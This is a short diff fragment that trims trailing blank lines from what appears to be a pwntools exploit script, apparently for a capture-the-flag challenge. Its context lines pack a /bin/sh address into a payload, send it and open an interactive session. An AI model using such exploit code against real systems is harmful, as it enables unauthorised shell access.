@@ -75,11 +75,3 @@ p += p32(ADDR_BINSH)
 r.sendline(p)
 
 r.interactive()
-
-
-
-
-
-
-
-
